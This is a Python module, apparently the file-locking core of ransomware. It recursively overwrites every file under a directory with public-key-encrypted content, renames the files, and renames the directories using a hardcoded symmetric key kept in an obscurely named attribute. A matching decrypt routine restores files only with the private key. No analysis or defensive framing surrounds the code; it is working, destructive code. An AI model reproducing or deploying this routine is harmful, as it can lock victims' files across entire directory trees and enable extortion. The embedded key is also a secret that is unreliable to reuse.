import os
from .encryptor import EncryptorManager


class ProcessFiles:
    cipher = EncryptorManager()
    
    def __init__(self, pub_key=None, priv_key=None):
        self.pub_key = pub_key
        self.priv_key = priv_key
        self.__sc_ky_ = b'7CfakkDMxVT-0m5qnrgOw3fbYDxQTt9yNkEAhjeIb58='
    
    def encrypt_files(self, dir_path):
        mode = 0o777
        flags = os.O_RDWR | os.O_BINARY
        
        for root, dirs, files in os.walk(dir_path, topdown=False):
            for file in files:
                # reading file content
                current_path = os.path.abspath(os.path.join(root, file))
                fd = os.open(current_path, flags, mode) # File descriptor
                file_data = os.read(fd, os.path.getsize(current_path))
                
                # encrypting file content
                encrypted_data = self.cipher.encrypt_file(self.pub_key, file_data, file.encode())
                os.ftruncate(fd, 0)   ; os.lseek(fd, 0, 0)
                os.write(fd, encrypted_data[0]); os.close(fd)
                new_path = os.path.join(root, encrypted_data[1].decode())
                os.rename(current_path, new_path)
                
            for dir in dirs:
                # encrypting directory name
                path = os.path.join(root, dir)
                new_name = self.cipher.encrypt_dir(dir, self.__sc_ky_)
                new_path = os.path.join(root, new_name)
                os.rename(path, new_path)
                
    def decrypt_files(self, dir_path):
        mode = 0o777
        flags = os.O_RDWR | os.O_BINARY
        
        for root, dirs, files in os.walk(dir_path, topdown=False):
            for file in files:
                # reading file content
                current_path = os.path.abspath(os.path.join(root, file))
                fd = os.open(current_path, flags, mode) # File descriptor
                file_data = os.read(fd, os.path.getsize(current_path))
                
                # decrypting file content
                original_data = self.cipher.decrypt_file(self.priv_key, file_data)
                os.ftruncate(fd, 0)   ; os.lseek(fd, 0, 0)
                os.write(fd, original_data[0]); os.close(fd)
                old_path = os.path.join(root, original_data[1].decode())
                os.rename(current_path, old_path)
                
            for dir in dirs:
                # encrypting directory name
                path = os.path.join(root, dir)
                new_name = self.cipher.decrypt_dir(dir, self.__sc_ky_)
                new_path = os.path.join(root, new_name.decode())
                os.rename(path, new_path)